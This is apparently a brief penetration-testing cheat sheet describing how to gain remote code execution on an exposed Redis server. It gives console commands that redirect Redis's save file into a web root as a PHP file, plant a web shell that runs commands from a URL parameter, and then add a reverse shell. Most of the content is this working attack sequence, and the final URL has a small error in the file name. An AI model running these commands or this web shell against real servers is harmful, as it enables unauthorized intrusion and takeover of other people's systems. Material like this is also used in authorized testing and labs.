# Redis

Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker (from here). By default and commonly Redis uses a plain-text based protocol, but you have to keep in mind that it can also implement ssl/tls. Learn how to run Redis with ssl/tls here.

## RCE
Look for writeble folder: default page apache -> `/var/www/html`

```console
10.10.221.234:6379> config set dir /var/www/html
OK
10.10.221.234:6379> config set dbfilename redis.php 
OK                                                                              
10.10.221.234:6379> set test "<?php phpinfo(); ?>"                                             
OK                                                                         
10.10.221.234:6379> save                                                                        
OK
```

Go to http://<ip>/redis.php

If its working change it to command execution:

```console
set test "<?php system($_GET['cmd']);?>"
+OK
save
+OK
```
Run you browser with: http://<ip>/redis?cmd=whoami
Now you can place a URL encoded reverse shell.